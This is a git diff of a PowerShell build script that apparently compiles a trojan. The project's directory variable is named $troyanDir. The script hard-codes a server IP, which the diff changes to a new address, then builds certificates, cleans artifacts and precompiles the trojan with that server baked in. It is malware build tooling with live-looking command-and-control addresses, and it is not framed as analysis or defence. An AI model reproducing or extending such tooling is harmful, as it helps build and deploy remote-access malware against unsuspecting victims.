@@ -1,7 +1,7 @@
 param (
     [string]$serverName
 )
-$serverName="185.247.141.76"
+$serverName="213.226.112.110"
 if ([string]::IsNullOrEmpty($serverName)) {
         throw "-serverName argument is null"
 }
@@ -22,11 +22,15 @@ Write-Host "certDir: $certDir"
 & (Join-Path -Path $scriptDir -ChildPath "./compile.cert.ps1") -serverName $serverName
 
 #clean
-$extensions = @(".dcu", ".res", ".exe")
+$extensions = @(".dcu", ".res", ".exe",".~pas","*.~dpr")
 foreach ($ext in $extensions) {
     Get-ChildItem -Path $troyanDir -Filter "*$ext" | Remove-Item -Force
 }
 Get-ChildItem -Path $troyanDir -Filter "_*" | Remove-Item -Force
+$readyScript=Join-Path -Path $troyanDir -ChildPath "_ready.ps1"
+if (Test-Path -Path $readyScript) {
+    Remove-Item -Path $readyScript
+}
 
 #precompile
 & (Join-Path -Path $troyanDir -ChildPath "./precompile.ps1") -serverName $serverName
